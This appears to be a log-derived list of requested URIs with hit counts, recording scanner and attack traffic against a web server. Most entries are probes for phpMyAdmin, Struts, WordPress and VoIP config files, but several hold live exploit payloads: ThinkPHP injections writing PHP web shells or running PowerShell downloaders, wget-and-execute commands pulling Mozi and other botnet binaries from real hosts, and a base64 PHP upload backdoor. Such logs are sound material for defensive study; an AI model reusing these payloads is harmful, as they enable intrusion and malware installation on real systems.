uri	uri_count
/phpMyAdmin-4.3.2	1
/phpMyAdmin-4.3.2/import.php	1
/phpMyAdmin-4.3.3	1
/phpMyAdmin-4.3.3/import.php	1
/phpMyAdmin-4.3.4	1
/phpMyAdmin-4.3.4/import.php	1
/phpMyAdmin-4.3.5	1
/phpMyAdmin-4.3.5/import.php	1
/phpMyAdmin-4.3.6	1
/phpMyAdmin-4.3.6/import.php	1
/phpMyAdmin-4.3.7	1
/phpMyAdmin-4.3.7/import.php	1
/phpMyAdmin-4.3.8	1
/phpMyAdmin-4.3.8/import.php	1
/phpMyAdmin-4.3.9	1
/phpMyAdmin-4.3.9/import.php	1
/phpMyAdmin-4.4.0	1
/phpMyAdmin-4.4.0-alpha1	1
/phpMyAdmin-4.4.0-alpha1/import.php	1
/phpMyAdmin-4.4.0-beta1	1
/phpMyAdmin-4.4.0-beta1/import.php	1
/phpMyAdmin-4.4.0-rc1	1
/phpMyAdmin-4.4.0-rc1/import.php	1
/phpMyAdmin-4.4.0/import.php	1
/phpMyAdmin-4.4.1	1
/phpMyAdmin-4.4.1-all-languages	1
/phpMyAdmin-4.4.1-all-languages/import.php	1
/phpMyAdmin-4.4.1.1	1
/phpMyAdmin-4.4.1.1-all-languages	1
/phpMyAdmin-4.4.1.1-all-languages/import.php	1
/phpMyAdmin-4.4.1.1/import.php	1
/phpMyAdmin-4.4.1/import.php	1
/phpMyAdmin-4.4.2	1
/phpMyAdmin-4.4.2-all-languages	1
/phpMyAdmin-4.4.2-all-languages/import.php	1
/phpMyAdmin-4.4.2/import.php	1
/phpMyAdmin-4.4.3	1
/phpMyAdmin-4.4.3-all-languages	1
/phpMyAdmin-4.4.3-all-languages/import.php	1
/phpMyAdmin-4.4.3/import.php	1
/phpMyAdmin-4.4.4	1
/phpMyAdmin-4.4.4-all-languages	1
/phpMyAdmin-4.4.4-all-languages/import.php	1
/phpMyAdmin-4.4.4/import.php	1
/phpMyAdmin-4.4.5	1
/phpMyAdmin-4.4.5-all-languages	1
/phpMyAdmin-4.4.5-all-languages/import.php	1
/phpMyAdmin-4.4.5/import.php	1
/phpMyAdmin-4.4.6	1
/phpMyAdmin-4.4.6-all-languages	1
/phpMyAdmin-4.4.6-all-languages/import.php	1
/phpMyAdmin-4.4.6.1	1
/phpMyAdmin-4.4.6.1-all-languages	1
/phpMyAdmin-4.4.6.1-all-languages/import.php	1
/phpMyAdmin-4.4.6.1/import.php	1
/phpMyAdmin-4.4.6/import.php	1
/phpMyAdmin-4.4.7	1
/phpMyAdmin-4.4.7-all-languages	1
/phpMyAdmin-4.4.7-all-languages/import.php	1
/phpMyAdmin-4.4.7/import.php	1
/phpMyAdmin-4.4.8	1
/phpMyAdmin-4.4.8-all-languages	1
/phpMyAdmin-4.4.8-all-languages/import.php	1
/phpMyAdmin-4.4.8/import.php	1
/phpMyAdmin-4.4.9	1
/phpMyAdmin-4.4.9-all-languages	1
/phpMyAdmin-4.4.9-all-languages/import.php	1
/phpMyAdmin-4.4.9/import.php	1
/phpMyAdmin/config/config.inc.php	1
/phpMyAdmin/css/phpmyadmin.css.php	1
/phpMyAdmin/libraries/database_interface.lib.php	1
/phpMyAdmin/print.css	1
/phpMyAdmin/scripts/config.inc.php	1
/phpMyAdmin/scripts/setup.ph	1
/phpMyAdmin/setup.php/index.php	1
/phpMyAdmin1	1
/phpMyAdmin1/import.php	1
/phpMyAdmin12	1
/phpMyAdmin12/import.php	1
/phpMyAdmin2	1
/phpMyAdmin2/import.php	1
/phpMyAdmin3	1
/phpMyAdmin4	1
/phpMyAds/scripts/setup.php	1
/php_debug	1
/phpadmin/	1
/phpgroupware/xmlrpc.php	1
/phpma	1
/phpma/import.php	1
/phpma/scripts/setup.php	1
/phpmanager/import.php	1
/phpmy	1
/phpmy-admin/import.php	1
/phpmyadmin-	1
/phpmyadmin-/import.php	1
/phpmyadmin/4.2/installing/	1
/phpmyadmin/config.inc.php	1
/phpmyadmin/config.user.inc.php	1
/phpmyadmin/config/config.inc.php	1
/phpmyadmin/config_inf.php	1
/phpmyadmin/image.php	1
/phpmyadmin/scripts/config.inc.php	1
/phpmyadmin/setup/setup.php	1
/phpmyadmin1	1
/phpmyadmin1/import.php	1
/phpmyadmin1/scripts/setup.php	1
/phpmyadmin12	1
/phpmyadmin12/import.php	1
/phpmyadmin2/import.php	1
/phpmyadmin2011	1
/phpmyadmin2011/scripts/setup.php	1
/phpmyadmin2012	1
/phpmyadmin2014	1
/phpmyadmin2015	1
/phpmyadmin2016	1
/phpmyadmin4	1
/phpmyadmin5/scripts/setup.php	1
/phppgadmin/scripts/setup.php	1
/phppma	1
/phppma/scripts/setup.php	1
/phprov/	1
/picture/ghf377.bmp	1
/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA=	1
/plugins/weathermap/editor.php?plug=0&mapname=conn.php&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=%3C?php%20echo(md5(1));echo%20%60$_REQUEST[id]%60;%20?%3E&map_legend=Traffic+Load&map_stamp=Created:+%b+%d+%Y+%H:%M:%S&map_linkdefaultwidth=7&map_linkdefaultbwin=100M&map_linkdefaultbwout=100M&map_width=800&map_height=600&map_pngfile=&map_htmlfile=&map_bgfile=--NONE--&mapstyle_linklabels=percent&mapstyle_htmlstyle=overlib&mapstyle_arrowstyle=classic&mapstyle_nodefont=3&mapstyle_linkfont=2&mapstyle_legendfont=4&item_configtext=Name	1
/pma/image.php	1
/pma/images.php	1
/pma/print.css	1
/pma/setup.php	1
/pma2005	1
/pma2005/import.php	1
/pma2006	1
/pma2006/import.php	1
/pma2011	1
/pma2011/scripts/setup.php	1
/pma2012	1
/pma2012/scripts/setup.php	1
/pma2014	1
/pma2016	1
/pma2018	1
/pmd	1
/politic/wp-login.php	1
/polycom	1
/portal/	1
/portal/client/cms	1
/post/echo	1
/pps/polycom/0004f2123456.cfg	1
/print.cgi	1
/private/checkPanel.php	1
/prov/y000000000000.cfg	1
/provision/000000000000.cfg	1
/provision/Yealink/WebItemsLevel.cfg	1
/provision/Yealink/y000000000000.cfg	1
/provision/polycom/000000000000.cfg	1
/provision/y000000000000.cfg	1
/provisioner/	1
/provisioning/p.php/	1
/provisioning/yealink/y000000000000.cfg	1
/ps/	1
/pub/	1
/pub/adobe/reader/win/11.x/11.0.11/misc/AdbeRdrUpd11011_incr.msp	1
/pub/errors/503.php	1
/public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/hzydocpgkwqdxiz30893.exe');start%20%SystemRoot%/Temp/hzydocpgkwqdxiz30893.exe	1
/public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/jnqhqdjpsfdntkq30823.exe');start%20%SystemRoot%/Temp/jnqhqdjpsfdntkq30823.exe	1
/public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/hluoaalqxjpaevn6047.exe');start%20C:/Windows/temp/hluoaalqxjpaevn6047.exe	1
/public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/wekedhonakjapzb21591.exe');start%20C:/Windows/temp/wekedhonakjapzb21591.exe	1
/public/index.php	1
/public/index.php/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=shell.php&vars%5B1%5D%5B%5D=%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22	1
/public/index.php/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=echo%20%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22%20%3E%3Eshell.php	1
/public/index.php/?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=echo%20%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22%20%3E%3Eshell.php	1
/public/index.php/?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=echo%20%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22%20%3E%3Eshell.php	1
/public/index.php/?s=index/%5Cthink%5CRequest/input&filter=phpinfo&data=echo%20%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22%20%3E%3Eshell.php	1
/public/index.php/?s=index/%5Cthink%5CRequest/input&filter=system&data=echo%20%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22%20%3E%3Eshell.php	1
/public/index.php/?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=shell.php&content=%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22	1
/public/index.php/?s=index/%5Cthink%5Cview%5Cdriver%5CPhp/display&content=echo%20%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22%20%3E%3Eshell.php	1
/public/index.php?s=/Index/%09hink%07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20104.168.253.82/thinkphp	1
/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/hzydocpgkwqdxiz30893.exe');start%20%SystemRoot%/Temp/hzydocpgkwqdxiz30893.exe	1
/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/jnqhqdjpsfdntkq30823.exe');start%20%SystemRoot%/Temp/jnqhqdjpsfdntkq30823.exe	1
/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/hluoaalqxjpaevn6047.exe');start%20C:/Windows/temp/hluoaalqxjpaevn6047.exe	1
/readme.txt	1
/refund.html	1
/register.action	1
/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession/	1
/resin-doc/	1
/rootDesc.xml	1
/sangoma/	1
/sb/index.php	1
/scottch/	1
/scripts/ajax/ckeditor/plugins/filemanager/filemanager.cfm	1
/scripts/cfformhistory.cfm	1
/scripts/setup.php/index.php	1
/search.action	1
/secrettalk.server/login.php	1
/server-status	1
/setup.cgi	1
/sftp-config.json?x=x	1
/shell?%65%63%68%6F%20%63%61%6E%6C%61%6E%67	1
/shell?cd+/tmp;rm+-rf+*;wget+http://222.139.254.221:49040/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws	1
/shell?cd+/tmp;wget+http:/\/185.62.188.45/jaws.sh+-O+-+>.ske.sh;chmod+777+.ske.sh;sh+.ske.sh	1
/shell?cd+/tmp;wget+http:/\/89.248.174.198/jaws.sh+-O+-+>smoke.sh;chmod+777+smoke.sh;sh+smoke.sh	1
/shell?uname%20-a	1
/shop/	1
/shop/CHANGELOG.txt	1
/shop/admin/	1
/shop/downloader/index.php	1
/shop/errors/503.php	1
/shop/index.php/admin/	1
/shop/index.php?l=page_view&p=advanced_search	1
/shop/pub/errors/503.php	1
/showcase.action	1
/sip/config/polycom/000000000000.cfg	1
/sip_phone/000000000000.cfg	1
/sipphone/	1
/site/CHANGELOG.txt	1
/soap	1
/solr/admin/info/system?wt=json	1
/spectralink/	1
/sql/myadmin	1
/sql/phpMyAdmin	1
/sql/phpmanager	1
/sql/phpmy-admin	1
/sql/phpmyadmin2	1
/sql/sql	1
/sql/sql.php	1
/sql/sqladmin	1
/sql/sqlweb	1
/sql/websql	1
/sqla/index.php	1
/sqladmin/	1
/stalker_portal/LICENSE	1
/stat	1
/stats/js/sorttable.js	1
/store/	1
/store/CHANGELOG.txt	1
/store/admin/	1
/store/downloader/index.php	1
/store/errors/503.php	1
/store/index.php/admin/	1
/store/pub/errors/503.php	1
/struts-2.3.20.1/login.action	1
/struts-2.3.20.3/login.action	1
/struts-2.3.20/login.action	1
/struts-2.3.24.1/login.action	1
/struts-2.3.24.3/login.action	1
/struts-2.3.24/login.action	1
/struts-2.3.28/login.action	1
/struts-2.3.29/login.action	1
/struts-2.3.31/login.action	1
/struts-2.5-BETA1/login.action	1
/struts-2.5-BETA3/login.action	1
/struts-2.5.10.1-src/login.action	1
/struts-2.5.10.1/login.action	1
/struts-2.5.10/login.action	1
/struts-2.5.2/login.action	1
/struts-2.5/login.action	1
/struts/login.action	1
/struts2-core-2.3.8/login.action	1
/struts2-showcase/login.action	1
/struts2/login.action	1
/struts2/showcase.action	1
/struts2_2.3.15.1-showcase/showcase.action	1
/sugarcrm/index.php	1
/sugarcrm/index.php?action=Login&module=Users	1
/sunshop/index.php?l=page_view&p=advanced_search	1
/templates/system/css/system.css	1
/test/CHANGELOG.txt	1
/text/	1
/themes/default/js/showdown.js	1
/tj.php	1
/tmp/vuln.php	1
/tmp/vuln2.php	1
/trunks/	1
/typo3/index.php	1
/ui/cbpc/login?lang=IT	1
/upgrade_handle.php?cmd=getupgradinginfo	1
/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;cd%20/tmp;wget%20http://178.128.11.199/qtx.arm;chmod%20777%20qtx.arm;./qtx.arm%20test;%27	1
/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;cd%20/tmp;wget%20http://178.128.169.200/qtx.arm%20-O%20z;chmod%20777%20z;./z%20upgrade;%27	1
/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;wget%20http://178.128.11.199/qtx.arm;chmod%20+x%20*;./qtx.arm%20test;%27	1
/upload.html	1
/upload.php	1
/user/login/	1
/user/register	1
/user/registrationPage.action	1
/user_login.action	1
/userlogin%21default.action	1
/users/	1
/v3.0/web/assets/css/site.css	1
/var/log/	1
/var/log/system.log	1
/vcs754/	1
/vcxud91x83/loading.php	1
/vendor/phpunit/phpunit/README.md	1
/vodafone/	1
/voice/	1
/voip_provisioning/	1
/vpn/index.html	1
/vportal/web/gateway	1
/vtech/	1
/vtech/vcs754/	1
/vtigercrm/index.php	1
/wallet/54e24501-f3bd-4917-8073-f628a7bfd287?format=json&resend_code=null&ct=1553455392555&api_code=1770d5d9-bcea-4d28-ad21-6cbd5be018a	1
/web-console/ServerInfo.jsp	1
/web/Index.action	1
/web/phpMyAdmin	1
/web/phpMyAdmin/import.php	1
/webDB	1
/webDB/import.php	1
/webSQL	1
/webSQL/import.php	1
/webadmin.nsf	1
/webadmin/import.php	1
/webapps/struts2-showcase/	1
/webcalendar/install/index.php	1
/webdb	1
/webdb/import.php	1
/webfig/master-078380d0e221.css	1
/websql/import.php	1
/whynot/sam.php	1
/wls_utc	1
/wordpress/%23wp-config.php%23	1
/wordpress/.wp-config.php.swp	1
/wordpress/post.php	1
/wordpress/wp-admin/install.php	1
/wordpress/wp-config.php.bak	1
/wordpress/wp-config.php~	1
/wordpress/xmlrpc.php	1
/wordpress3/wp-login.php	1
/wordpress4/wp-login.php	1
/wordpress7/wp-login.php	1
/wordpress8/wp-login.php	1
/wordpress9/wp-login.php	1
/wp-admin/admin-ajax.php	1
/wp-admin/install.php	1
/wp-config.php.bak	1
/wp-config.php~	1
/wp-content/plugins/ezpz-one-click-backup/extensions/ext-about.php?task=a	1
/wp-content/plugins/ezpz-one-click-backup/functions/ezpz-archive-cmd.php	1
/wp-content/plugins/ezpz-one-click-backup/functions/ezpz-archive-cmd.php?cmd=echo+PD9waHAgY2xhc3MgYXtjb25zdCBiPScxJztjb25zdCBjPScwJztwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGQoJGUpIHskZj0kX0ZJTEVTWydfJ11bJ3RtcF9uYW1lJ107aWYobW92ZV91cGxvYWRlZF9maWxlKCRmLF9fRklMRV9fKSkge2RpZShzZWxmOjpiKTt9ZWxzZXtkaWUoc2VsZjo6Yyk7fX19YTo6ZCgkX1BPU1QpOw%3D%3D+%7C+base64+-d+-+%3E+..%2Fextensions%2Fext-about.php	1
/wp-content/plugins/woocommerce/vendor/phpunit/phpunit/src/Util/Filereader.php?task=a	1
/wp-content/plugins/woocommerce/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php	1
/wp-content/plugins/wp-phpmyadmin/wp-phpmyadmin/phpmyadmin/	1
/wp-includes/	1
/wp-includes/SimplePie/ogi.exe	1
/wp-includes/js/nri.exe	1
/wp-log/push.php	1
/wp-phpmyadmin/	1
/wp-phpmyadmin/phpmyadmin/	1
/wp/%23wp-config.php%23	1
/wp/.wp-config.php.swp	1
/wp/wp-admin/install.php	1
/wp/wp-config.php.bak	1
/wp/wp-config.php~	1
/wp2/wp-login.php	1
/wp3/wp-login.php	1
/wwscripts/ajax/ckeditor/plugins/filemanager/filemanager.cfm	1
/wwscripts/cfformhistory.cfm	1
/xVKC	1
/xampp/phpmyadmin/	1
/xampp/phpmyadmin/import.php	1
/xmlrpc/xmlrpc.php	1
/xmlservices/	1
/xmlsrv/xmlrpc.php	1
/y000000000004.cfg	1
/y000000000005.cfg	1
/y000000000007.cfg	1
/y000000000027.cfg	1
/y000000000034.cfg	1
/y000000000036.cfg	1
/y000000000054.cfg	1
/yealink/WebItemsLevel.cfg	1
/yealink/y000000000027.cfg	1
/yealink/y000000000028.cfg	1
/yealink/y000000000029.cfg	1
/yeastar/	1
/z/style.css	1
/zabbix/api_jsonrpc.php	1
/zabbix/httpmon.php	1
/zabbix/proxies.php	1
/~/phpmanager/	1
/~/phpmanager/scripts/setup.php	1
